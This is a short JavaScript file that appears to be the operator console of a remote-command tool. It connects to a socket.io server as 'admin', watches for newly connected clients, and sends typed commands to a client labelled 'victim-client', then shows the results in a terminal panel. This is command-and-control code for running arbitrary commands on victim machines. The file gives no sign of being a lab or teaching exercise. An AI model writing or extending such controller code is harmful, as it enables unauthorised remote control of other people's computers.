const socket = io("http://localhost:3000");

socket.on("connect", () => {
  console.log("Connected to server as admin");

  // Listen for new clients
  socket.on("newClient", (clientId) => {
    console.log("New client connected:", clientId);
  });

  // Listen for command results
  socket.on("commandResult", (result) => {
    document.getElementById("terminal").innerText += `\n${JSON.stringify(
      result
    )}`;
  });
});

function sendCommand() {
  const cmd = document.getElementById("commandInput").value;
  const data = { clientId: "victim-client", command: cmd };
  socket.emit("command", data);
}
